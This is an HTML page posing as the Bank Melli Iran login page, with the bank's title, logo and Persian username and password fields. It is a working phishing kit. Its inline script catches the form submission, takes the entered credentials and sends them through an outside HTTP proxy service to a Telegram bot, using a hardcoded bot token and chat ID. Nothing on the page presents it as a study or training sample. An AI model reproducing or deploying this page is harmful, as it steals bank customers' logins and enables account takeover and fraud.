<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>بانک ملی ایران</title>
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css"
    rel="stylesheet"
    integrity="sha384-LN+7fdVzj6u52u30Kp6M/trliBMCMKTyK833zpbD+pXdCLuTusPj697FH4R/5mcr"
    crossorigin="anonymous"
  />
  <style>
    * {
      font-weight: bold;
      font-size: xx-large;
    }
    .inputs {
      border: none;
      border-bottom: 1px solid #cccccc;
      margin: 0 18px 0 8px;
      width: 100%;
      height: 34px;
      padding: 5px;
      font-size: 20px;
      font-family: bmifont;
      border-radius: 0;
    }
    .btn {
      display: inline-block;
      margin-bottom: 0;
      font-weight: 400;
      text-align: center;
      vertical-align: middle;
      touch-action: manipulation;
      cursor: pointer;
      background-image: none;
      border: 1px solid transparent;
      white-space: nowrap;
      padding: 6px 12px;
      font-size: 20px;
      line-height: 1.42857143;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      width: 100%;
      font-family: bmifont;
    }
  </style>
</head>
<body
  style="
    background-image: url('background2.jpg');
    display: flex;
    align-items: center;
    justify-content: center;
  "
>
  <div
    style="
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-color: rgba(255, 255, 255, 0.51);
      margin-top: 5%;
      padding: 34px 10px 8px 20px;
      width: 400px;
      min-height: 350px;
      text-align: center;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.34);
    "
  >
    <img src="bmi-logo.png" alt="" style="width: 75px" />
    <br />
    <form>
      <div class="form-group">
        <input
          class="form-control inputs"
          id="exampleInputEmail1"
          aria-describedby="emailHelp"
          placeholder="نام کاربری"
        />
      </div>
      <br />
      <div class="form-group">
        <input
          type="password"
          class="form-control inputs"
          id="exampleInputPassword1"
          placeholder="رمز عبور"
          style="position: relative; bottom: 40px;"
        />
      </div>
      <br />
      <button
        type="submit"
        class="btn btn-primary"
        style="width: 100%"
      >
        ورود
      </button>
    </form>
  </div>

  <script
    src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
    integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
    crossorigin="anonymous"
  ></script>
  <script
    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/js/bootstrap.min.js"
    integrity="sha384-7qAoOXltbVP82dhxHAUje59V5r2YsVfBafyUDxEdApLPmcdhBPg1DKg1ERo0BZlK"
    crossorigin="anonymous"
  ></script>
  <script>
    document.querySelector("form").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("exampleInputEmail1").value;
      const password = document.getElementById("exampleInputPassword1").value;

      // تنظیم اطلاعات پیام و توکن
      const botToken = "7754084867:AAERTauvbabUNG3EvtjQfe0mpLUC3UrdfKY";
      const chatId = "2078475433";
      const message = `کاربر: ${username}، رمز: ${password}`;

      // کدگذاری متن پیام
      const encodedMessage = encodeURIComponent(message);

      // ساخت URL
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;

      // ساخت درخواست fetch
      fetch("https://httpdebugger.com/tools/ViewHttpHeaders.aspx", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          "UrlBox": url,
          "AgentBox": "Google Chrome",
          "VersionsList": "HTTP/1.1",
          "MethodList": "GET"
        })
      })
      .then(response => response.text())
      .then(data => console.log(data))
      .catch(error => console.error("Error:", error));
    });
  </script>
</body>
</html>
